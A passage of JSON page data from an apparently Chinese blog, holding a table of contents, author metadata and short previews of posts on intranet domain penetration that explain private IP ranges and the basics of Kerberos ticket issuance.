href=\"#0x02-%E6%8E%A2%E9%92%88\"><span class=\"toc-text\">0x02 探针</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x03-%E8%AF%B7%E6%B1%82\"><span class=\"toc-text\">0x03 请求</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x04-%E7%A0%B4%E8%A7%A3\"><span class=\"toc-text\">0x04 破解</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x05-%E9%87%8D%E5%86%99\"><span class=\"toc-text\">0x05 重写</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x06-%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">0x06 总结</span></a></li></ol></li></ol>","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"内网安全-域横向渗透【五】","uid":"58d39df92467e98ccd5e4018d930afdc","slug":"内网安全-域横向渗透【五】","date":"2022-07-15T11:33:18.000Z","updated":"2022-07-18T02:04:58.618Z","comments":true,"path":"api/articles/内网安全-域横向渗透【五】.json","keywords":null,"cover":[],"text":"0x00脑图： 0x01 知识点0x00 内外网判断 内网ip地址是私有ip地址（10&#x2F;8, 172.16&#x2F;12 , 192.168&#x2F;16），除此之外就是外网ip。 0x01 内网1和内网2通信问题 两个不同的内网的主机想要通过CS或者MSF等工具实...","link":"","photos":[],"count_time":{"symbolsCount":"2.8k","symbolsTime":"3 mins."},"categories":[{"name":"内网渗透","slug":"内网渗透","count":7,"path":"api/categories/内网渗透.json"}],"tags":[{"name":"内网渗透","slug":"内网渗透","count":7,"path":"api/tags/内网渗透.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"内网安全-域横向渗透【三】","uid":"f3c27b71dabaf6ecc45b5a407a397e09","slug":"内网安全-域横向渗透【三】","date":"2022-06-28T13:22:21.000Z","updated":"2022-06-29T12:17:00.942Z","comments":true,"path":"api/articles/内网安全-域横向渗透【三】.json","keywords":null,"cover":[],"text":"0x00脑图： 0x01 Kerberos 协议###0x00 图解 0x01 介绍 客户机将明文密码进行 NTLM 哈希,然后和时间戳一起加密(使用krbtgt 密码 hash 作为密钥)，发送给 kdc（域控），kdc 对用户进行检测，成功之后创建 TGT(Ticket-Gr...","link":"","photos":[],"count_time":{"symbolsCount":"4.1k","symbolsTime":"4 mins."},"categories":[{"name":"内网渗透","slug":"内网渗透","count":7,"path":"api/categories/内网渗透.json"}],"tags":[{"name":"内网渗透","slug":"内网渗透","count":7,"path":"api/tags/内网渗透.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}